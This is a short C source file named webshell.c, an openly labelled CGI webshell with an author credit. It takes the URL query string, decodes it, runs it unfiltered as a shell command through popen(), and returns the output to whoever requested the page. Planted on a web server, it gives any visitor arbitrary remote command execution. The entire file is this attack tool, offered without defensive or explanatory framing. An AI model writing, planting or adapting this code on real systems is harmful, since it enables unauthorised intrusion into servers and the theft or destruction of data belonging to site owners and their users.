/*
 * webshell.c
 *
 * By: Juan Lago D. <juanparati@gmail.com>
 *
 * CGI Webshell
 *
 */

#include <stdio.h>
#include <stdlib.h>


int main() {

	FILE *in;
	extern FILE *popen();
    char buff[512];
	char *data;

	data = getenv("QUERY_STRING");

	printf("Content-type: text/plain\n\n");
	printf("Webshell.cgi\n");
	printf("------------\n");

	if (data != NULL) {

		unescape_url(data);

		printf("$ %s\n\n",data);

		if (!(in = popen(data, "r"))) {
			return -1;
		}

	    while (fgets(buff, sizeof(buff), in) != NULL ) {
		    printf("%s", buff);
		}

		pclose(in);

	}


	return 0;

}

// Convert a two-char hex string into the char it represents.
// http://www.jmarshall.com/easy/cgi/getcgi.c.txt
char x2c(char *what) {
   register char digit;

   digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
   digit *= 16;
   digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
   return(digit);
}

// Reduce any %xx escape sequences to the characters they represent.
void unescape_url(char *url) {
    register int i,j;

    for(i=0,j=0; url[j]; ++i,++j) {
        if((url[i] = url[j]) == '%') {
            url[i] = x2c(&url[j+1]) ;
            j+= 2 ;
        }
    }
    url[i] = '\0' ;
}






